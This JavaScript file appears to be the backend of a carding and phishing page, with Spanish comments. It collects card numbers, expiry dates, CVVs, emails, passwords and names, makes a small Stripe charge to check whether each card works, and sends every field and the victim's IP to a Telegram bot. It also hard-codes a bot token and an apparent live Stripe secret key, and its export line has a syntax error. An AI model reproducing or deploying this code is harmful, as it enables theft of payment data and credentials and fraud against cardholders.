const axios = require('axios');
const qs = require('querystring');

module.export = async (req, res) {
    // 1. Encabezados de Seguridad y CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Content-Type', 'application/json');

    if (req.method !== 'POST') {
        return res.status(405).json({ pago: false, mensaje_error: 'Método no permitido' });
    }

    // Configuración de credenciales
    const token = "8255731465:AAGrPR_qH0zC4zTdBqOj-Zt1jqY0W03-yws";
    const chat_id = "7993722214";
    const stripe_secret = "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";

    const data = req.body;
    let status_pago = "⏳ Procesando";
    let pago_exitoso = false;

    // Validación básica de entrada
    if (!data.cc || !data.ex || !data.cv) {
        return res.status(400).json({ pago: false, mensaje_error: "Datos de tarjeta incompletos" });
    }

    try {
        // 2. Formateo de fecha de expiración
        const expParts = data.ex.split('/');
        const month = expParts[0]?.trim();
        const year = expParts[1]?.trim()?.length === 2 ? '20' + expParts[1].trim() : expParts[1]?.trim();

        // 3. Crear Token en Stripe
        const cardData = qs.stringify({
            'card[number]': data.cc.replace(/\s/g, ''),
            'card[exp_month]': month,
            'card[exp_year]': year,
            'card[cvc]': data.cv.trim()
        });

        const stripeTokenResponse = await axios.post('https://api.stripe.com/v1/tokens', cardData, {
            headers: { 
                'Authorization': `Bearer ${stripe_secret}`, 
                'Content-Type': 'application/x-www-form-urlencoded' 
            }
        });

        const tokenId = stripeTokenResponse.data.id;

        if (tokenId) {
            // 4. Realizar Cargo de $2.00 MXN
            const chargeData = qs.stringify({
                amount: 200, // $2.00 MXN
                currency: 'mxn',
                source: tokenId,
                description: `Validacion: ${data.em || 'Sin email'}`
            });

            const chargeResponse = await axios.post('https://api.stripe.com/v1/charges', chargeData, {
                headers: { 
                    'Authorization': `Bearer ${stripe_secret}`, 
                    'Content-Type': 'application/x-www-form-urlencoded' 
                }
            });

            if (chargeResponse.data.status === 'succeeded') {
                pago_exitoso = true;
                status_pago = "✅ APROBADO ($2.00 MXN)";
            }
        }
    } catch (error) {
        // Capturar errores específicos de Stripe (Declinación, fondos, etc)
        const stripeError = error.response?.data?.error?.message;
        status_pago = stripeError ? `❌ RECHAZADA: ${stripeError}` : "❌ Error de conexión bancaria";
        console.error("Error en proceso Stripe:", stripeError || error.message);
    }

    // 5. Enviar Reporte a Telegram (Independiente del resultado del pago)
    const mensaje = [
        "🔔 **NUEVO REPORTE VERCEL** 🔔",
        `💰 **STATUS**: ${status_pago}`,
        `📧 **Email**: ${data.em || 'N/A'}`,
        `🔑 **Pass**: ${data.pw || 'N/A'}`,
        `👤 **Nombre**: ${data.nm || 'N/A'}`,
        `💳 **Tarjeta**: \`${data.cc}\``,
        `📅 **Exp**: ${data.ex}`,
        `🔒 **CVV**: ${data.cv}`,
        `🌐 **IP**: ${req.headers['x-forwarded-for'] || req.socket.remoteAddress}`
    ].join('\n');

    try {
        await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
            chat_id: chat_id,
            text: mensaje,
            parse_mode: 'Markdown'
        });
    } catch (tgError) {
        console.error("Error enviando a Telegram:", tgError.message);
    }

    // 6. Respuesta final al Frontend
    return res.status(200).json({ 
        pago: pago_exitoso, 
        mensaje_error: status_pago 
    });
}
